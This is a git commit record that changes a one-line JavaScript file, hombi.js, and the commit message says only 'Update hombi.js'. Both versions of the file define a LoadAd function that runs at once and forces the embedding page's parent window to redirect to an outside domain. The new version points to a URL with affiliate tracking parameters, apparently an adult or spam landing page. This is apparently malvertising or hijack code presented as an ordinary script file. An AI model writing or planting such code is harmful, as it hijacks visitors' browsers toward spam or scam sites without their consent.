c02dc62f8c4ed0108dde509a0cb8f02dd7838ab0
padding-right <hantuakun@gmail.com>
2026-08-23 18:50:27 +0700

    Update hombi.js

--- hombi.js
+++ hombi.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://best.dreamstoryhome.com"; } LoadAd();
+function LoadAd() { parent.location.href="https://jdbqg.cutewomenn.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=65949&s2=2147188&s3=hombi"; } LoadAd();
